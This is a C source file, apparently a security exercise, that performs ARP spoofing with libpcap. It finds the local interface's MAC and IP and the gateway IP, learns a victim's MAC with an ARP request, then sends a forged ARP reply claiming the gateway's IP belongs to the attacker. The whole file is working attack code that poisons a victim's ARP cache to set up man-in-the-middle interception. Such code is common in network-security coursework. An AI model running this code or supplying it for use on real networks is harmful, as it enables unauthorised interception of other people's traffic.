#include<pcap/pcap.h>
#include<stdio.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<unistd.h>
#include<netinet/ether.h>
#include<netinet/in.h>
#include<netinet/ip.h>
#include<net/ethernet.h>
#include<net/if_arp.h>
#include<stdlib.h>
#include<arpa/inet.h>
#include<string.h>

#define ip 100
int getattackerinfo(sockaddr_in * attacker_ip , unsigned char *attacker_mac , sockaddr_in * gateway_ip, char * dev)
{	
	int sock;
	struct ifreq ifr;
	char gateway[ip]={0,};
	char test[100]={0,};
	FILE * fp;

	sock=socket(AF_INET,SOCK_DGRAM,0);
        if(sock<0)
        {       
                printf("socket fail");
                return -1;
        }       
//attacker's mac_address       
	memset(&ifr,0x00,sizeof(ifr));
	strcpy(ifr.ifr_name, (const char *)dev);
	printf("%s",ifr.ifr_name);
        ifr.ifr_addr.sa_family=AF_INET;
        if(ioctl(sock,SIOCGIFHWADDR,&ifr) != 0 )
	{
		printf("ioctl error");
		return -1;
	}

	memcpy(attacker_mac,(unsigned char *)ifr.ifr_hwaddr.sa_data,ETHER_ADDR_LEN);

//attacker's ip
	if(ioctl(sock, SIOCGIFADDR, &ifr)!=0)
	{
		printf("ioctl error");
		return -1;
	}

	memcpy(attacker_ip,&ifr.ifr_addr,sizeof(sockaddr));
	close(sock);
// gateway ip
	fp=popen("netstat -rn | grep -A 1 Gateway | grep 0.0.0.0 | awk '{print$2}' ","r" );
	if(fp==NULL)
	{
		printf("fail to get gateway");
		return -1;
	}
	
	fgets(gateway,100,fp);

	if( inet_aton((const char*)gateway, &(gateway_ip->sin_addr)) ==0 )
	{
		printf("change dot decimal to big endian fail -gateway_ip");
		return -1;
	}
	pclose(fp);

	return 0;
}


int main(int argc, char * argv[])
{
	char * dev, errbuf[PCAP_ERRBUF_SIZE];
	pcap_t * handle;
	struct pcap_pkthdr * header;
	unsigned char * arp_reqpack;
	unsigned char * arp_spoofpack;
	struct ether_header ethernet;
	struct ether_arp arp_header;
	struct ether_header ethernet_spoof;
	struct ether_arp arp_header_spoof;
	struct sockaddr_in * attacker_ip=NULL;
	unsigned char * attacker_mac=NULL;
	unsigned char * victim_mac=NULL;
	struct sockaddr_in * gateway_ip=NULL;
	const u_char *data;
	int result,t;
	struct in_addr victim_ip;
	ether_header * cmp_ethernet;
	ether_arp * cmp_arp;
	
	victim_mac=(unsigned char *)malloc(ETH_ALEN);
	attacker_ip=(sockaddr_in *)malloc(16);
	gateway_ip=(sockaddr_in *)malloc(16);
	attacker_mac=(unsigned char  *)malloc(14);
	arp_reqpack=(unsigned char *)malloc(sizeof(ether_arp)+sizeof(ether_header));
	arp_spoofpack=(unsigned char *)malloc(sizeof(ether_arp)+sizeof(ether_header));


	inet_aton(argv[1],&victim_ip);
	dev=pcap_lookupdev(errbuf);
	if(dev == NULL)
	{
		fprintf(stderr,"fail to find device: %s\n",errbuf);
		return -1;
	}

	handle=pcap_open_live(dev,BUFSIZ,1,1000,errbuf);

	if(handle==NULL)
	{
		fprintf(stderr, "fail to open device %s: %s\n", dev, errbuf);
	}

	if(getattackerinfo(attacker_ip,attacker_mac,gateway_ip,dev) !=0)
	{
		printf("fail to get attacker info ");
		return -1;
	}

	

	memcpy(ethernet.ether_shost,attacker_mac,ETHER_ADDR_LEN);
	ether_aton_r("ff:ff:ff:ff:ff:ff",(ether_addr *)ethernet.ether_dhost);
	ethernet.ether_type= (unsigned int)htons(0x0806);

	memcpy(arp_reqpack,&ethernet,sizeof(struct ether_header));
	

	arp_header.arp_hrd=htons(ARPHRD_ETHER);
	arp_header.arp_pro=htons(ETHERTYPE_IP);
	arp_header.arp_hln=ETHER_ADDR_LEN;
	arp_header.arp_pln=sizeof(struct in_addr);
	arp_header.arp_op=htons(ARPOP_REQUEST);
	memcpy(arp_header.arp_sha,attacker_mac,ETHER_ADDR_LEN);
	ether_aton_r("00:00:00:00:00:00",(ether_addr *)arp_header.arp_tha);
	memcpy(arp_header.arp_spa,&attacker_ip->sin_addr,sizeof(in_addr));
	memcpy(arp_header.arp_tpa,&victim_ip,sizeof(in_addr));	
	memcpy(arp_reqpack+14,&arp_header,sizeof(ether_arp));
	

	while(1)
	{
		if(pcap_sendpacket(handle, arp_reqpack, sizeof(ether_arp)+sizeof(ether_header)) != 0  )
        	{
               		 printf("fail to send packet");
               		 return -1;
        	}


		for(t=0;t<100;t++)
		{
			result=pcap_next_ex(handle, &header, &data);
			if(result != 1)
				continue;

			cmp_ethernet=(ether_header *)data;

			if(ntohs(cmp_ethernet->ether_type) !=0x0806)
				continue;

			cmp_arp=(ether_arp *)(data+14);
	
			if(ntohs(cmp_arp->arp_op) != ARPOP_REPLY)
				continue;

			if(memcmp(cmp_arp->arp_spa, &victim_ip,sizeof(in_addr)) != 0)
				continue;
			memcpy(victim_mac ,cmp_arp->arp_sha,ETHER_ADDR_LEN);
			break;
		}
		
		if(t==100)
			continue;
		break;
	}


	memcpy(ethernet_spoof.ether_shost,attacker_mac,ETHER_ADDR_LEN);
        memcpy(ethernet_spoof.ether_dhost, victim_mac,ETHER_ADDR_LEN);
        ethernet_spoof.ether_type= (unsigned int)htons(0x0806);

        memcpy(arp_spoofpack,&ethernet_spoof,sizeof(struct ether_header));

        arp_header_spoof.arp_hrd=htons(ARPHRD_ETHER);
        arp_header_spoof.arp_pro=htons(ETHERTYPE_IP);
        arp_header_spoof.arp_hln=ETHER_ADDR_LEN;
        arp_header_spoof.arp_pln=sizeof(struct in_addr);
        arp_header_spoof.arp_op=htons(ARPOP_REPLY);
        memcpy(arp_header_spoof.arp_sha,attacker_mac,ETHER_ADDR_LEN);
        memcpy(arp_header_spoof.arp_tha,victim_mac,ETHER_ADDR_LEN);
        memcpy(arp_header_spoof.arp_spa,&gateway_ip->sin_addr,sizeof(in_addr));
        memcpy(arp_header_spoof.arp_tpa,&victim_ip,sizeof(in_addr));

        memcpy(arp_spoofpack+14,&arp_header_spoof,sizeof(ether_arp));

	pcap_sendpacket(handle, arp_spoofpack, sizeof(ether_arp)+sizeof(ether_header));


	return 0;
}
